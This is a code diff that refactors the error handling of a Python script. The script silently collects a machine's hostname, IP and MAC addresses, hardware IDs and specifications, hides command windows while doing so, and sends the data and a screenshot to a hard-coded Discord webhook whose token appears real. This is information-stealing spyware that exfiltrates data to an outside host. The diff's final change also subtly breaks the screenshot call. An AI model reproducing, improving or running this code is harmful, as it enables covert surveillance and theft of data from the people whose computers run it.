@@ -12,6 +12,7 @@ from PIL import ImageGrab  # Alternative method for screenshots
 
 # Replace with your actual Discord webhook
 WEBHOOK_URL = "https://discord.com/api/webhooks/1337690537716617236/65it_yqKBVgIQeCPJVGVUqDmz3S7bmXhcG-f5gUIFzdAHKO0N5yoauwZyBvQzi54y-BF"
+
 def get_gpu_info():
     try:
         startupinfo = subprocess.STARTUPINFO()
@@ -21,54 +22,57 @@ def get_gpu_info():
             shell=True, startupinfo=startupinfo
         ).decode()
         return result.split("\n")[1].strip() if len(result.split("\n")) > 1 else "N/A"
-    except:
+    except Exception as e:
+        print(f"Error retrieving GPU info: {e}")
         return "Could not retrieve"
 
 def get_local_ip():
     try:
         return socket.gethostbyname(socket.gethostname())
-    except:
+    except Exception as e:
+        print(f"Error retrieving local IP: {e}")
         return "N/A"
 
 def get_public_ip():
     try:
         return requests.get("https://api64.ipify.org?format=json", timeout=3).json()["ip"]
-    except:
+    except Exception as e:
+        print(f"Error retrieving public IP: {e}")
         return "Could not retrieve"
 
 def get_mac_address():
-    return ':'.join(re.findall('..', '%012x' % uuid.getnode()))
+    try:
+        return ':'.join(re.findall('..', '%012x' % uuid.getnode()))
+    except Exception as e:
+        print(f"Error retrieving MAC address: {e}")
+        return "N/A"
 
 def get_hardware_id():
-    return str(uuid.UUID(int=uuid.getnode()))
+    try:
+        return str(uuid.UUID(int=uuid.getnode()))
+    except Exception as e:
+        print(f"Error retrieving hardware ID: {e}")
+        return "N/A"
 
 def get_system_info():
-    info = {
-        "Hostname": socket.gethostname(),
-        "Local IP": get_local_ip(),
-        "MAC Address": get_mac_address(),
-        "Hardware ID": get_hardware_id(),
-        "OS": f"{platform.system()} {platform.release()} ({platform.architecture()[0]})",
-        "OS Version": platform.version(),
-        "Processor": platform.processor(),
-        "CPU Cores": psutil.cpu_count(logical=False),
-        "Logical CPUs": psutil.cpu_count(logical=True),
-        "RAM Size": f"{round(psutil.virtual_memory().total / (1024 ** 3), 2)} GB",
-        "Disk Storage": f"{round(psutil.disk_usage('/').total / (1024 ** 3), 2)} GB"
-    }
-    return info
-
-def get_gpu_info():
     try:
-        startupinfo = subprocess.STARTUPINFO()
-        startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW  # Hides CMD window
-        result = subprocess.check_output(
-            "wmic path win32_videocontroller get caption",
-            shell=True, startupinfo=startupinfo
-        ).decode()
-        return result.split("\n")[1].strip() if len(result.split("\n")) > 1 else "N/A"
-    except:
-        return "Could not retrieve"
+        info = {
+            "Hostname": socket.gethostname(),
+            "Local IP": get_local_ip(),
+            "MAC Address": get_mac_address(),
+            "Hardware ID": get_hardware_id(),
+            "OS": f"{platform.system()} {platform.release()} ({platform.architecture()[0]})",
+            "OS Version": platform.version(),
+            "Processor": platform.processor(),
+            "CPU Cores": psutil.cpu_count(logical=False),
+            "Logical CPUs": psutil.cpu_count(logical=True),
+            "RAM Size": f"{round(psutil.virtual_memory().total / (1024 ** 3), 2)} GB",
+            "Disk Storage": f"{round(psutil.disk_usage('/').total / (1024 ** 3), 2)} GB"
+        }
+        return info
+    except Exception as e:
+        print(f"Error retrieving system info: {e}")
+        return {}
 
 def get_motherboard_info():
     try:
@@ -79,39 +83,34 @@ def get_motherboard_info():
             shell=True, startupinfo=startupinfo
         ).decode()
         return result.split("\n")[1].strip() if len(result.split("\n")) > 1 else "N/A"
-    except:
+    except Exception as e:
+        print(f"Error retrieving motherboard info: {e}")
         return "Could not retrieve"
 
 def send_to_discord(info):
     """Send system information to Discord."""
-    data = {
-        "content": "**System Information**",
-        "embeds": [
-            {
-                "title": "PC Info",
-                "color": 16711680,  # Red
-                "fields": [{"name": key, "value": str(value), "inline": False} for key, value in info.items()]
-            }
-        ]
-    }
-
-    response = requests.post(WEBHOOK_URL, json=data)
-def get_gpu_info():
     try:
-        startupinfo = subprocess.STARTUPINFO()
-        startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW  # Hides CMD window
-        result = subprocess.check_output(
-            "wmic path win32_videocontroller get caption",
-            shell=True, startupinfo=startupinfo
-        ).decode()
-        return result.split("\n")[1].strip() if len(result.split("\n")) > 1 else "N/A"
-    except:
-        return "Could not retrieve"
+        data = {
+            "content": "**System Information**",
+            "embeds": [
+                {
+                    "title": "PC Info",
+                    "color": 16711680,  # Red
+                    "fields": [{"name": key, "value": str(value), "inline": False} for key, value in info.items()]
+                }
+            ]
+        }
+
+        response = requests.post(WEBHOOK_URL, json=data)
+        if response.status_code != 204:
+            print(f"Failed to send system info to Discord. Status code: {response.status_code}")
+    except Exception as e:
+        print(f"Error sending system info to Discord: {e}")
+
 def take_screenshot():
     """Capture a screenshot of the current screen and save it."""
-    screenshot_path = os.path.join(os.getenv("TEMP"), "screenshot.png")
     try:
-        # Use PyAutoGUI for cross-platform support
+        screenshot_path = os.path.join(os.getenv("TEMP"), "screenshot.png")
         screenshot = pyautogui.screenshot()
         screenshot.save(screenshot_path)
         return screenshot_path
@@ -126,14 +125,16 @@ def send_screenshot():
         print("No screenshot to send.")
         return
 
-    with open(screenshot_path, "rb") as file:
-        files = {"file": file}
-        response = requests.post(WEBHOOK_URL, files=files)
-
-    if response.status_code == 204:
-        print("Screenshot sent successfully!")
-    else:
-        print(f"Failed to send screenshot. Status code: {response.status_code}")
+    try:
+        with open(screenshot_path, "rb") as file:
+            files = {"file": file}
+            response = requests.post(WEBHOOK_URL, files=files)
+        if response.status_code == 204:
+            print("Screenshot sent successfully!")
+        else:
+            print(f"Failed to send screenshot. Status code: {response.status_code}")
+    except Exception as e:
+        print(f"Error sending screenshot to Discord: {e}")
 
 if __name__ == "__main__":
     system_info = get_system_info()
@@ -153,4 +154,4 @@ if __name__ == "__main__":
     send_to_discord(system_info)
 
     # Capture and send screenshot
-    send_screenshot()
+    send_screenshot
